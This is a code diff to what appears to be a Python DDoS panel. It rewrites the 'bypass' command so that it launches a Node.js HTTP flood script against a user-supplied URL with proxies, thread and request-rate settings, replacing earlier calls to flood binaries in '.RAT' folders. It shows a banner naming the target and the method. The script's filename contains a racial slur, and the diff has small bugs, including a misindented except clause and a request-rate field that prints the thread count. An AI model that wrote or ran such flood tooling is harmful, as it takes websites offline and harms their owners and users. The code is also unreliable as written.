@@ -673,11 +673,14 @@ def main():
 		elif sinput == "bypass" or sinput == "BYPASS":
 			try:
 				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
-				os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 100 GET proxy.txt 32')
-				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
+				time = sin.split()[2]
+				thread = sin.split()[3]
+				proxy = sin.split()[4]
+				rps = sin.split()[5]
+				os.system(f'node HTTP-NIGGA.js {host} {time} {thread} {proxy} {rps}')
+            except IndexError:
+                print('Usage: bypass <url> <time> <thread> <http.txt> <request_connenction>')
+                print('Example: bypass https://example.com 60 10 http.txt 5000')
 				os.system ("clear")
 				print(f"""
 \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
@@ -688,7 +691,9 @@ def main():
 \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
 \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
+\033[1;37m                THREAD   : \033[35m[ \033[1;37m{thread} \033[35m]
+\033[1;37m                Proxy   : \033[35m[ \033[1;37m{proxy} \033[35m]
+\033[1;37m                Rps   : \033[35m[ \033[1;37m{thread} \033[35m]
 \033[1;37m                METHOD   : \033[35m[ \033[1;37mBYPASS \033[35m]
 \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
 \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
